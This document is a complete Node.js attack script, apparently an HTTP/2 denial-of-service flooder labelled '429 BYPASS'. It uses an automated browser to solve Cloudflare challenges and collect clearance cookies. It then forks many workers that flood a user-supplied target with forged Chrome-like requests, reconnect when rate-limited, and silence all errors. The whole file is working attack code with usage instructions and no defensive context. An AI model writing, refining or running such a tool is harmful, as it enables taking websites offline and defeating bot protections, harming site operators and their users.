const { connect } = require("puppeteer-real-browser");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const EventEmitter = require('events');

EventEmitter.defaultMaxListeners = 0;

const MAX_CONCURRENT_STREAMS_PER_WORKER = 150;

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = [
    "rsa_pkcs1_md5",
    "rsa_pkcs1_sha1",
    "dsa_sha1",
    "ecdsa_sha1",
    "rsa_pkcs1_md4"
];

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

if (process.argv.length < 6) {
    console.log("\x1b[31m======[ 429 BYPASS CONCURRENT 50 ]======\x1b[0m");
    console.log("\x1b[31mUsage: node byp <target> <time> <rate> <threads> <cookieCount>\x1b[0m");
    console.log("\x1b[33mExample: node byp https://target.com 60 5 4 5\x1b[0m");
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    cookieCount: parseInt(process.argv[6]) || 2
};

let currentRate = args.Rate;
let last429Time = 0;
let consecutive429 = 0;

function flood(userAgent, cookie) {
    try {
        let parsed = url.parse(args.target);
        let path = parsed.path;

        function randomDelay(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }
        let intervalTime = randomDelay(1000, 1500);

        function getChromeVersion(userAgent) {
            const chromeVersionRegex = /Chrome\/([\d.]+)/;
            const match = userAgent.match(chromeVersionRegex);
            if (match && match[1]) {
                return match[1];
            }
            return "145.0.0.0";
        }

        const chromever = getChromeVersion(userAgent);
        const randValue = list => list[Math.floor(Math.random() * list.length)];
        const lang_header1 = [
            "en-US,en;q=0.9", "en-GB,en;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9"
        ];

        let fixed = {
            ":method": "GET",
            ":authority": parsed.host,
            ":scheme": "https",
            ":path": path,
            "user-agent": userAgent,
            "upgrade-insecure-requests": "1",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "cookie": cookie,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "sec-ch-ua": '"Chromium";v="' + chromever.split('.')[0] + '", "Not)A;Brand";v="8", "Chrome";v="' + chromever.split('.')[0] + '"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Windows",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": randValue(lang_header1),
            "priority": "u=1, i"
        };

        let headers = { ...fixed };

        const secureOptionsList = [
            crypto.constants.SSL_OP_NO_RENEGOTIATION,
            crypto.constants.SSL_OP_NO_TICKET,
            crypto.constants.SSL_OP_NO_SSLv2,
            crypto.constants.SSL_OP_NO_SSLv3,
            crypto.constants.SSL_OP_NO_COMPRESSION,
            crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
            crypto.constants.SSL_OP_TLSEXT_PADDING,
            crypto.constants.SSL_OP_ALL
        ];

        const tlsSocket = tls.connect({
            host: parsed.host,
            port: 443,
            servername: parsed.host,
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3",
            ALPNProtocols: ["h2"],
            ciphers: ciphers,
            sigalgs: sigalgs.join(':'),
            ecdhCurve: "X25519:P-256:P-384",
            secureOptions: secureOptionsList[Math.floor(Math.random() * secureOptionsList.length)],
            rejectUnauthorized: false
        });

        tlsSocket.on('error', () => {
            if (!tlsSocket.destroyed) tlsSocket.destroy();
        });

        const client = http2.connect(parsed.href, {
            createConnection: () => tlsSocket,
            settings: {
                headerTableSize: 65536,
                enablePush: false,
                initialWindowSize: 6291456,
                maxConcurrentStreams: 1000
            }
        });

        client.on("connect", () => {
            const requestLoop = setInterval(() => {
                if (client.destroyed || client.closed) {
                    clearInterval(requestLoop);
                    return;
                }

                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers, {
                        weight: Math.random() < 0.5 ? 42 : 256,
                        depends_on: 0,
                        exclusive: false
                    });

                    request.on("response", (res) => {
                        global.successRequests = (global.successRequests || 0) + 1;
                        global.totalRequests = (global.totalRequests || 0) + 1;

                        if (res[":status"] === 429 || res[":status"] === 503) {
                            client.close();
                        }
                    });

                    request.on("error", () => {
                        global.failedRequests = (global.failedRequests || 0) + 1;
                    });

                    request.end();
                }
            }, intervalTime);
        });

        client.on("close", () => {
            if (!client.destroyed) client.destroy();
            setTimeout(() => flood(userAgent, cookie), 1000);
        });

        client.on("error", () => {
            if (!client.destroyed) client.destroy();
        });

    } catch (err) {
        // Catch synchronous errors
    }
}


async function bypassCloudflareOnce(attemptNum) {
    let browser = null;
    let page = null;

    try {
        console.log("\x1b[33m[CF Bypass] Attempt " + attemptNum + "...\x1b[0m");

        const response = await connect({
            headless: false,
            turnstile: true,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-blink-features=AutomationControlled'
            ],
            customConfig: {},
            connectOption: {
                defaultViewport: null
            },
            disableXvfb: false
        });

        if (!response || !response.browser) {
            throw new Error("Failed to launch browser");
        }

        browser = response.browser;
        page = response.page;

        console.log("\x1b[33m[CF Bypass] Accessing " + args.target + "...\x1b[0m");

        await page.goto(args.target, { waitUntil: 'domcontentloaded', timeout: 60000 });

        // Tunggu challenge selesai
        let challengeCompleted = false;
        let checkCount = 0;

        while (!challengeCompleted && checkCount < 60) {
            await new Promise(r => setTimeout(r, 1000));
            const cookies = await page.cookies();
            const cfClearance = cookies.find(c => c.name === "cf_clearance");

            if (cfClearance) {
                challengeCompleted = true;
                break;
            }
            checkCount++;
        }

        const cookies = await page.cookies();
        const cfClearance = cookies.find(c => c.name === "cf_clearance");
        const userAgent = await page.evaluate(() => navigator.userAgent);

        if (browser) await browser.close();

        if (cfClearance) {
            console.log("\x1b[32m[CF Bypass] Success! Got cf_clearance\x1b[0m");
            return { cookies, userAgent, success: true };
        } else {
            console.log("\x1b[31m[CF Bypass] Failed - No cf_clearance\x1b[0m");
            return { cookies: [], userAgent, success: false };
        }

    } catch (error) {
        console.log("\x1b[31m[CF Bypass] Error: " + error.message + "\x1b[0m");
        if (browser) {
            try { await browser.close(); } catch (e) { }
        }
        return { success: false };
    }
}

async function bypassCloudflareParallel(totalCount) {
    console.log("\x1b[35m429 BYPASS - CONCURRENT 50\x1b[0m");
    const results = [];

    for (let i = 0; i < totalCount; i++) {
        const res = await bypassCloudflareOnce(i + 1);
        if (res.success) results.push(res);
        if (results.length >= totalCount) break;
    }

    if (results.length === 0) {
        console.log("\x1b[31mFailed to get CF cookies. Using fallback.\x1b[0m");
        results.push({
            cookies: [],
            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            success: true
        });
    }
    return results;
}

function runFlooder() {
    const bypassInfo = global.bypassData[Math.floor(Math.random() * global.bypassData.length)];
    if (!bypassInfo) return;

    const cookieString = bypassInfo.cookies ? bypassInfo.cookies.map(c => c.name + "=" + c.value).join("; ") : "";
    const userAgent = bypassInfo.userAgent || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

    flood(userAgent, cookieString);
}

function displayStats() {
    const elapsed = Math.floor((Date.now() - global.startTime) / 1000);

    console.clear();
    console.log("\x1b[31m======[ 429 BYPASS CONCURRENT 50 ]======\x1b[0m");
    console.log("\x1b[36mTarget:\x1b[0m " + args.target);
    console.log("\x1b[36mTime:\x1b[0m " + elapsed + "s / " + args.time + "s");
    console.log("\x1b[36mCurrent Rate:\x1b[0m " + currentRate + " req/s (Max: " + args.Rate + ")");
    console.log("\x1b[36mTotal:\x1b[0m " + (global.totalRequests || 0) + " | \x1b[32mOK:\x1b[0m " + (global.successRequests || 0) + " | \x1b[31mErr:\x1b[0m " + (global.failedRequests || 0));
    console.log("\x1b[36m429 Count:\x1b[0m " + consecutive429);
}

global.totalRequests = 0;
global.successRequests = 0;
global.failedRequests = 0;
global.retryCount = 0;
global.startTime = Date.now();
global.bypassData = [];

if (cluster.isMaster) {
    console.clear();
    console.log("\x1b[35m429 BYPASS SYSTEM - CONCURRENT 50\x1b[0m");

    (async () => {
        const bypassResults = await bypassCloudflareParallel(args.cookieCount);
        global.bypassData = bypassResults;

        console.log("\n\x1b[32mGot " + bypassResults.length + " sessions. Forking " + args.threads + " workers...\x1b[0m");

        global.startTime = Date.now();

        for (let i = 0; i < args.threads; i++) {
            const worker = cluster.fork();
            worker.send({ type: 'bypassData', data: bypassResults });
        }

        const statsInterval = setInterval(displayStats, 1000);

        cluster.on('message', (worker, message) => {
            if (message.type === 'stats') {
                global.totalRequests += message.total || 0;
                global.successRequests += message.success || 0;
                global.failedRequests += message.failed || 0;
            }
        });

        setTimeout(() => {
            clearInterval(statsInterval);
            console.log("\n\x1b[32mAttack completed.\x1b[0m");
            process.exit(0);
        }, args.time * 1000);
    })();

} else {
    process.on('message', (msg) => {
        if (msg.type === 'bypassData') {
            global.bypassData = msg.data;

            for (let i = 0; i < MAX_CONCURRENT_STREAMS_PER_WORKER; i++) {
                setTimeout(() => runFlooder(), i * 50);
            }

            setInterval(() => {
                process.send({
                    type: 'stats',
                    total: global.totalRequests || 0,
                    success: global.successRequests || 0,
                    failed: global.failedRequests || 0
                });
                global.totalRequests = 0;
                global.successRequests = 0;
                global.failedRequests = 0;
            }, 1000);
        }
    });
}

process.on('uncaughtException', (e) => { });
process.on('unhandledRejection', (e) => { });